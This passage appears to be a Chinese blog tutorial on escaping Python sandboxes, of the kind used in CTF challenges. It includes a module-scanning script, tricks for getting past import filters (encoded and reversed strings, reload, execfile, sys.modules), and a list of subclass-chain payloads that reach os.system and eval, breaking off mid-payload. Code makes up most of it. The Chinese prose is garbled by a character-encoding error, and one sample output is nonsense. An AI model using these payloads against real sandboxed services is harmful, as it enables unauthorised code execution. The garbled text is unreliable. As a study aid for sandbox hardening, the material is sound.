&apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;\n]\n\nmethods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]\n\nresults = {}\nfor module in all_modules_3:\n    results[module] = {\n        &apos;flag&apos;: 0,\n        &apos;result&apos;: {}\n    }\n\n    try:\n        m = __import__(module)\n        attrs = dir(m)\n        for method in methods:\n            if method in attrs:\n                result = &apos;yes&apos;\n                results[module][&apos;flag&apos;] = 1\n            else:\n                result = &apos;no&apos;\n\n            results[module][&apos;result&apos;][method] = result\n\n    except Exception as e:\n        print(e)\n\nfor result in results:\n    if results[result][&apos;flag&apos;]:\n        print(&apos;[+]&apos; + result)\n        for r in results[result][&apos;result&apos;]:\n            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>ä»ç»“æœå¯ä»¥çœ‹åˆ°æœ‰ç›¸å½“å¤§ä¸€éƒ¨åˆ†æ¨¡å—éƒ½å¯¼å…¥äº†â€œå±é™©â€çš„å‡½æ•°ã€‚åªè¦æˆ‘ä»¬å¯ä»¥ <code>import</code> é‚£ä¹ˆå­˜åœ¨è¿™äº›æ¨¡å—çš„ç¯å¢ƒå°±æ˜¯å±é™©çš„ã€‚</p>\n<h3 id=\"å¦‚æœæˆ‘ä»¬æ²¡åŠæ³•-import-å‘¢ï¼Ÿ\"><a href=\"#å¦‚æœæˆ‘ä»¬æ²¡åŠæ³•-import-å‘¢ï¼Ÿ\" class=\"headerlink\" title=\"å¦‚æœæˆ‘ä»¬æ²¡åŠæ³• import å‘¢ï¼Ÿ\"></a>å¦‚æœæˆ‘ä»¬æ²¡åŠæ³• import å‘¢ï¼Ÿ</h3><p>å¦‚æœåªæ˜¯ç®€å•çš„ç¦ç”¨ <code>import os</code> æˆ‘ä»¬å¯ä»¥åŠ ç©ºæ ¼ç»•è¿‡ <code>import   os</code> .</p>\n<p>å¦‚æœå¤šä¸ªç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†æˆ‘ä»¬è¿˜å¯ä»¥ <code>__import__(&#39;os&#39;)</code>.</p>\n<p>å¦‚æœè¿‡æ»¤ os æˆ‘ä»¬è¿˜å¯ä»¥ <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>ã€‚</p>\n<p>å¦‚æœè¿™ä¹Ÿä¸è¡Œè¿˜æœ‰ <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p>\n<p>è”æƒ³åˆ°æˆ‘ä»¬ä¸Šé¢è¯´çš„ <code>__builtin__/__builtins__</code>,ä¸€äº›å±é™©å†…å»ºå‡½æ•°éƒ½å¯ä»¥ç›´æ¥ç”¨ï¼Œå¦‚æœè¿™äº›å‡½æ•°éƒ½è¢« del æ‰æˆ‘ä»¬å¯ä»¥ <code>reload(__builtin__)</code> æ¥é‡è½½ä¸€ä¸ªå®Œæ•´çš„ <code>__builtin__</code>.</p>\n<p>reload ä¹Ÿæ˜¯å†…å»ºå‡½æ•°ï¼Œå¦‚æœè¿™ä¹Ÿæ²¡äº†å‘¢ï¼Ÿ </p>\n<pre><code>import imp\nimp.reload(__builtin__)</code></pre><p>ä¹Ÿå¯ä»¥å¼•å…¥ã€‚</p>\n<p>å¦‚æœ <code>sys.modules[&#39;os&#39;]=None</code> ä»æ ¹æºåˆ é™¤å‘¢ï¼Ÿ</p>\n<p>å®é™…ä¸Šè”ç³»åˆ° import çš„åŸç†</p>\n<blockquote>\n<p>å¦‚æœæ˜¯ import Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå¹¶åŠ è½½ A<br>å¦‚æœæ˜¯ from A import Bï¼Œå…ˆä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå†è§£æAï¼Œä»ä¸­å¯»æ‰¾Bå¹¶å¡«å……åˆ° A çš„ dict ä¸­</p>\n</blockquote>\n<p>å¦‚æœ <code>sys</code> å¯ä»¥ç”¨çš„è¯å¯ä»¥å…ˆç¡®è®¤ä¸€ä¸‹è·¯å¾„</p>\n<pre><code>import sys\nprint(sys.path)</code></pre><p>æœ¬è´¨ä¸Šæ˜¯æ‰§è¡Œä¸€éå¯¼å…¥çš„åº“ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç”¨ <code>execfile</code> æ¥ä»£æ›¿</p>\n<pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)\nsystem(&apos;ls&apos;)</code></pre><p>3.x ä¸­åˆ é™¤äº† execfile ï¼Œä¸è¿‡å¯ä»¥è¿™æ ·ï¼š</p>\n<pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:\n    exec(f.read())\nsystem(&apos;ls&apos;)</code></pre><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šå½“æˆ‘ä»¬ä½¿ç”¨ del sys.modules[â€˜osâ€™] æ—¶æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œå› ä¸ºåœ¨import æ—¶ä¼šåœ¨æ£€æµ‹åˆ°ä¸å­˜åœ¨ os æ—¶é‡è½½ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥</p>\n<pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj ä¸ºä½ åŠ çš„\n\ndel sys.modules[&apos;os&apos;]\nimport os\nos.system(&apos;ls&apos;)</code></pre><h3 id=\"å…¶ä»–ä¸€äº›å°æŠ€å·§\"><a href=\"#å…¶ä»–ä¸€äº›å°æŠ€å·§\" class=\"headerlink\" title=\"å…¶ä»–ä¸€äº›å°æŠ€å·§\"></a>å…¶ä»–ä¸€äº›å°æŠ€å·§</h3><ol>\n<li><p>è¿‡æ»¤æ‰æ•´ä¸ªåŒ¹é…è¯­å¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å˜é‡æ›¿æ¢çš„æ–¹å¼</p>\n<p> a = open<br> print(a(â€œd:/test.txtâ€).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1â€¦</type></mount></file></p>\n</li>\n<li><p>å‡½æ•°åé¢åŠ ç©ºæ ¼ã€æ¢è¡Œéƒ½èƒ½æ‰§è¡Œ</p>\n</li>\n<li><p>å¦‚æœç¨‹åºä¸­è°ƒç”¨äº†ç¬¬ä¸‰æ–¹çš„åº“ï¼Œæ°å¥½è¿™ä¸ªåº“æœ‰æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°</p>\n<p> from numpy.distutils.exec_command import _exec_command as system</p>\n<p> system(â€œls /â€œ)</p>\n</li>\n<li><p>ä½¿ç”¨åˆ«å</p>\n<p> import os as o</p>\n</li>\n<li><p>å­—ç¬¦ä¸²æ‹¼æ¥</p>\n<p> â€œlâ€+â€sâ€</p>\n<p> â€œfunc_globalâ€+â€sâ€</p>\n</li>\n<li><p>å­—ç¬¦ä¸²ç¼–ç æˆ–è€…å…¶ä»–æ“ä½œ</p>\n<p> â€˜X19pbXBvcnRfXw==â€™.decode(â€˜base64â€™) //<strong>import</strong></p>\n<p> <strong>import</strong>(â€˜soâ€™[::-1]).system(â€˜lsâ€™)</p>\n<p> eval(â€˜)â€imaohwâ€(metsys.)â€soâ€(<strong>tropmi</strong>â€˜[::-1])</p>\n<p> exec(â€˜)â€imaohwâ€(metsys.so ;so tropmiâ€™[::-1])</p>\n</li>\n</ol>\n<h2 id=\"é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸\"><a href=\"#é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸\" class=\"headerlink\" title=\"é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸\"></a>é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸</h2><p>é€šè¿‡ Python çš„ç»§æ‰¿å…³ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³åˆ©ç”¨çš„æ¨¡å—è¢«æ€äº†ä¹‹åæˆ‘ä»¬æƒ³åŠæ³•æ„é€ ä¸€æ¡åˆ°åŸºç±»çš„é“¾ç„¶åå†è‡ªé¡¶å‘ä¸‹é‡æ–°æ‰¾åˆ°ä¸€ä¸ªå¯è¡Œçš„è·¯æ¥ä½¿ç”¨ç›®æ ‡æ¨¡å—ã€‚ </p>\n<p>python ç±»ä¸­æœ‰ä¸ªå±æ€§å« <strong>mro</strong> ,æ˜¯ä¸ªå…ƒç»„è®°å½•äº†ç»§æ‰¿å…³ç³»ã€‚</p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</code></pre><p>é€šè¿‡æ–‡ç« æœ€å¼€å§‹çš„ä»‹ç»æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å¤šæ¬¡ä½¿ç”¨ <code>__base__</code> æ¥æ‰¾åˆ°åŸºç±» <code>object</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__\n&lt;type &apos;object&apos;&gt;</code></pre><p>ç„¶åä»åŸºç±»å‘ä¸‹å›æº¯ï¼Œä½¿ç”¨ <code>__subclasses__</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__\n&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()\n[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>æˆ‘ä»¬å‘ç°ç»“æœå¤ªå¤šäº†ï¼Œç½‘ä¸Šæ‰¾åˆ° bendawang å¸ˆå‚…çš„è„šæœ¬æ¥å¾ªç¯æ‰¾ä¸€ä¸‹</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in [].__class__.__base__.__subclasses__():\n    try:\n        if &apos;os&apos; in item.__init__.__globals__:\n            print cnt,item\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>åˆ©ç”¨è¿™ä¸ªæ¥æ‰¾åˆ° <code>os</code> æ¨¡å—çš„å…¥å£</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():\n    try:\n        cnt2=0\n        for i in item.__init__.__globals__:\n            if &apos;eval&apos; in item.__init__.__globals__[i]:\n                print cnt,item,cnt2,i\n            cnt2+=1\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>è¿™ä¸ªç›¸å½“äºæ›´æ·±å…¥ä¸€å±‚æŸ¥æ‰¾</p>\n<p>å­˜åœ¨çš„å­æ¨¡å—å¯ä»¥é€šè¿‡ .index() æ¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨è¿”å›ç´¢å¼•</p>\n<pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x ç‰ˆæœ¬ä¸­æœ‰ä¸€ä¸ª warnings </p>\n<pre><code>&gt;&gt;&gt; import warnings\n&gt;&gt;&gt; warnings.os\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nAttributeError: &apos;module&apos; object has no attribute &apos;os&apos;\n&gt;&gt;&gt; warnings.linecache\n&lt;module &apos;linecache&apos; from &apos;F:\\python2.7\\lib\\linecache.pyc&apos;&gt;\n&gt;&gt;&gt; warnings.linecache.os\n&lt;module &apos;os&apos; from &apos;F:\\python2.7\\lib\\os.pyc&apos;&gt;</code></pre><p>æˆ‘ä»¬å¯ä»¥</p>\n<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>ç®€å•çš„ç»™åŸºç±»çš„æ‰€æœ‰æ¨¡å—ç¼–å·</p>\n<pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>å¦‚ä½•ä¾¿æ·çš„æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„å…¥å£</p>\n<pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id=\"å¤§ä½¬ä»¬çš„payload\"><a href=\"#å¤§ä½¬ä»¬çš„payload\" class=\"headerlink\" title=\"å¤§ä½¬ä»¬çš„payload\"></a>å¤§ä½¬ä»¬çš„payload</h3><ol>\n<li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    